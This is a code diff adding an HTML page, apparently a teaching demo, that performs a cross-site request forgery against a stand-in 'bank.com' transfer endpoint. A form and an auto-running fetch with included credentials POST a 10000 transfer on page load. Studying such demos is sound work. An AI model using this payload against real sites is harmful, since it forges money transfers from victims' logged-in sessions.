@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta
+    name="viewport"
+    content="width=, initial-scale=1.0"
+  >
+  <title>CSRF攻击网页，嵌入 bank.com 的请求</title>
+</head>
+
+<body>
+  <h1>
+    CSRF攻击网页，嵌入 bank.com 的请求
+  </h1>
+  <form
+    action="https://bank.com:8088/transfer"
+    method="POST"
+  >
+    <input
+      name="money"
+      value="10000"
+    >
+    <input
+      type="submit"
+      value="提交"
+    >
+  </form>
+  <a href="https://bank.com:8088/transfer">网上的链接不要乱点击！！！！</a>
+</body>
+<script>
+  // js 的 csrf 攻击
+  fetch('https://bank.com:8088/transfer', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      money: 10000
+    }),
+    credentials: 'include'
+  }).then(res => res.json()).then(res => {
+    console.log('🍀🍀🍀🍀', res)
+  })
+</script>
+
+</html>
